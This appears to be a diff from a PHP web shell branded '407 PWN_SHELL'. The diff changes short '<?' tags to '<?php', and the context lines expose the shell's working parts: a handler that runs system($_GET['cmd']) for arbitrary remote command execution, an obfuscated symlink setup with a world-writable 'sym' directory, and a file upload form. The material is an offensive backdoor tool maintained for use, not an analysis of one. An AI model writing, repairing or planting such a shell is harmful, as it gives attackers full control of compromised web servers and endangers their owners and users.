@@ -276,7 +276,7 @@ echo '  </head>
 <title>407 PWN_SHELL</title>
 <img src=https://i.ibb.co/4Tc5RNT/1564219626227.png height=90℅>';
 ?>
-<?
+<?php
 echo'<table align="left">
 <font size="3">
 <tr><td>';
@@ -583,7 +583,7 @@ echo '</center>';
 <body>
 </table>
 <div class=\'all\'>
-<?
+<?php
 @mkdir('sym', 0777);
 $IIIIIIIIIIl1 = "Options all 
  DirectoryIndex Sux.html 
@@ -783,7 +783,7 @@ echo '</center><form enctype="multipart/form-data" method="POST"><font color="bl
 
 </body>
 <font color="white" size="4">
-<?
+<?php
     if(isset($_GET['cmd'])){
         echo "<pre>";
         $asu = system($_GET['cmd']);
@@ -1741,7 +1741,7 @@ echo '</table>
 }
 ?>
 </br>
-<?
+<?php
 echo '<center><a href="https://www.facebook.com/groups/1217219985083200/"><button>[ 407 Authentic Exploit - Since 2018 ]</a></button></body>';
 function perms($file){
 $perms = fileperms($file);
